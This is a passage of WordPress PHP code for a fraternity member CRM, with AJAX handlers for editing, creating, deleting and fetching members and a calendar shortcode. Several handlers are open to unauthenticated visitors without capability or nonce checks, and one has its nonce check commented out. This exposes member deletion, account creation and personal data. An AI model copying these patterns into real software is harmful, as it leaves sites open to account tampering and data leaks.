    $chaptercrossed =$_POST['chapter_crossed'];
    $officesheld = $_POST['offices_held'];
    $fratname = $_POST['frat_name'];
    $datecrossed =$_POST['date_crossed'];
    $linename = $_POST['line_name'];
    $alumnichapteraffliation = $_POST['alumni_chapter_affliation'];
    $dueamount = $_POST['due_amount'];



    update_field('address_', $address , 'user_'.$user_id);
    update_field('city',$get_city , 'user_'. $user_id); // NOT WORKING
    update_field('state',$state , 'user_'. $user_id); // WORKING
    update_field('zip', $get_zip , 'user_'. $user_id);// NOT WORKING
    update_field('occupation',$occupation , 'user_'. $user_id); //WORKING
    update_field('home_phone',$home_phone , 'user_'. $user_id); //WORKING
    update_field('mobile_phone',$mobilephone , 'user_'. $user_id);//WORKING
    update_field('chapter_crossed',$chaptercrossed , 'user_'. $user_id);  //WORKING
    update_field('offices_held',$officesheld , 'user_'. $user_id);//WORKING
    update_field('frat_name',$fratname , 'user_'. $user_id); //WORKING
    update_field('date_crossed',$datecrossed , 'user_'. $user_id); //WORKING
    update_field('line_name',$linename , 'user_'. $user_id); //WORKING
    update_field('alumni_chapter_affliation',$alumnichapteraffliation , 'user_'. $user_id); //working
    update_field('due_amount',$dueamount , 'user_'. $user_id); //working


}


add_action("wp_ajax_nopriv_remove_crm_user_database", "remove_crm_user_database");
add_action("wp_ajax_remove_crm_user_database", "remove_crm_user_database");


function remove_crm_user_database(){
    $user_id = $_POST['user_id'];
    require_once(ABSPATH.'wp-admin/includes/user.php' );
    $roles = array();
    $user = get_userdata($user_id);
    $capabilities = $user->{$wpdb->prefix . 'capabilities'};
    if (!isset($wp_roles))
        $wp_roles = new WP_Roles();
    foreach ($wp_roles->role_names as $role => $name) :
        if (array_key_exists($role, $capabilities))
            $roles[] = $role;
    endforeach;
    if (!in_array("administrator", $roles)) {
        if (wp_delete_user($user_id)) {
            echo 'User deleted' . $user_id;
            echo '<br>';
        }
    }

    exit();


}



add_action("wp_ajax_nopriv_add_data_in_crm_database", "add_data_in_crm_database");
add_action("wp_ajax_add_data_in_crm_database", "add_data_in_crm_database");


function add_data_in_crm_database(){


    $username = $_POST['username'];
    $password =  $_POST['password'];
    $user_email = $_POST['user_email'];
    $firstname =  $_POST['firstname'];
    $lasname=   $_POST['lastname'];
    $address =  $_POST['address'];
    $city = $_POST['city'];
    $zip = $_POST['zip'];
    $homephone =  $_POST['homephone'];
    $mobilephone = $_POST['mobilephone'];
    $chaptercrossed = $_POST['chaptercrossed'];
    $officesheld = $_POST['officeheld'];
    $fratname =$_POST['fratname'];
    $datecrossed = $_POST['datecross'];
    $alumnichapteraffliation = $_POST['alumnichapteraffliation'];
    $dueamount = $_POST['dueamount'];
    $linename = $_POST['linename'];
    $user_id = wp_insert_user(array(
            'user_login'        =>  $username,
            'user_pass'         =>  $password,
            'user_email'        =>  $user_email,
            'first_name'        =>  $firstname,
            'last_name'         =>  $lasname,
            'user_registered'   =>  date('Y-m-d H:i:s'),
            'role'              =>  'subscriber'
        )

    );

    update_field('address',$address , 'user_'. $user_id);
    update_field('city',$city , 'user_'. $user_id);
    update_field('zip',$zip , 'user_'. $user_id);
    update_field('home_phone',$homephone , 'user_'. $user_id);
    update_field('mobile_phone',$mobilephone , 'user_'. $user_id);
    update_field('chapter_crossed',$chaptercrossed , 'user_'. $user_id);
    update_field('offices_held',$officesheld , 'user_'. $user_id);
    update_field('frat_name',$fratname , 'user_'. $user_id);
    update_field('date_crossed',$datecrossed , 'user_'. $user_id);
    update_field('alumni_chapter_affliation',$alumnichapteraffliation , 'user_'. $user_id);
    update_field('due_amount',$dueamount , 'user_'. $user_id);
    update_field('line_name',$linename , 'user_'. $user_id);






}




add_action("wp_ajax_nopriv_user_data_get", "user_data_get");
add_action("wp_ajax_user_data_get", "user_data_get");
function user_data_get() {
    // if ( !wp_verify_nonce( $_REQUEST['nonce'], "my_user_vote_nonce")) {
    //     exit("No naughty business please");
    //  }
    $user_id =  $_POST['user_id'];
    $result['Data'][] = array(   'user_id' => $user_id,    'address'      => get_field('address_',  'user_'. $user_id ),
        'city'         => get_field('city',  'user_'. $user_id),
        'state'        => get_field('state',  'user_'. $user_id ) ,
        'zip'          => get_field('zip',  'user_'. $user_id ),
        'occupation'   =>  get_field('occupation',  'user_'. $user_id ),
        'home_phone' =>   get_field('home_phone',  'user_'. $user_id ),
        'mobile_phone' =>   get_field('mobile_phone',  'user_'. $user_id ),
        'chapter_crossed' =>   get_field('chapter_crossed',  'user_'. $user_id ),
        'offices_held' =>   get_field('offices_held',  'user_'. $user_id ),
        'frat_name' =>   get_field('frat_name',  'user_'. $user_id ),
        'date_crossed' =>   get_field('date_crossed',  'user_'. $user_id ),
        'line_name' =>   get_field('line_name',  'user_'. $user_id ),
        'alumni_chapter_affliation' =>   get_field('alumni_chapter_affliation',  'user_'. $user_id )
    );
    $result['type'] = "success";
    $result = json_encode($result);
    echo $result;
    exit();
}

// Calender View

add_shortcode('display_calender','my_comment_time_ago_function');
function my_comment_time_ago_function() {

    global $current_user;
    $email = $current_user->user_email;
    $user_id = $current_user->ID;
    global $wpdb;
    $results = $wpdb->get_results( "SELECT * FROM wp_ihc_user_levels WHERE user_id = {$user_id}", OBJECT );

    ?>

    <div class="container">
        <div class="row display">
            <div class="col-lg-12">
                <div class="notification">
                    <div class="notification-image">



                        <div class="end-date">

                            End Date: <?php echo $results[0]->expire_time ;?>

                        </div>
                        <div class="start-date">

                            Start Date: <?php echo $results[0]->start_time ;?>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/3.10.2/fullcalendar.min.css"
            integrity="sha512-KXkS7cFeWpYwcoXxyfOumLyRGXMp7BTMTjwrgjMg0+hls4thG2JGzRgQtRfnAuKTn2KWTDZX4UdPg+xTs8k80Q=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    />
    <div id="calendar"></div>

    <!-- Load Jquery -->
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"
    ></script>
    <!-- Movments -->
    <script
            src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"
            integrity="sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    ></script>
    <!-- Fulll calendar -->

    <script
            src="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/3.10.2/fullcalendar.min.js"
            integrity="sha512-o0rWIsZigOfRAgBxl4puyd0t6YKzeAw9em/29Ag7lhCQfaaua/mDwnpE2PVzwqJ08N7/wqrgdjc2E0mwdSY2Tg=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    ></script>
    <script>
        jQuery(document).ready(function() {

            jQuery('#calendar').fullCalendar({
                header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'month'
                },


        // eventRender: function (event, element, view) {
        //         var nextEventLeft = element.offset().left + element.width() + 5;
        //           element.parent().children().eq(element.index()+1).css('left',nextEventLeft);
        //         },
        //         selectable: true,
        //         selectHelper: true,

        // //defaultDate: '2016-12-12',
        // navLinks: false, // can click day/week names to navigate views
        // editable: false,
        // eventLimit: true, // allow "more" link when too many events
        // events: [


        // // {
        // // title: 'My Subscription',
        // 				// 	start: '<?php echo $results[0]->start_time;?>',
        // 				// 	end: '<?php echo $results[0]->expire_time;?>'

        // // },


        // ],




        // });

        //  function IsCurrentMonth() {
        //         if ($('.fc-today-button').hasClass('fc-state-disabled'))
        //             $('.fc-prev-button').closest('#calendar').addClass('current-month');
        //         else
        //             $('.fc-prev-button').closest('#calendar').removeClass('current-month');
        //     }
        //     IsCurrentMonth();
        //     $('.fc-prev-button').click(function() {
        //         IsCurrentMonth();
        //     });

        //  $('.fc-next-button').click(function() {
        //         IsCurrentMonth();
        //     });


        // });


        // </script>
    <?php



}
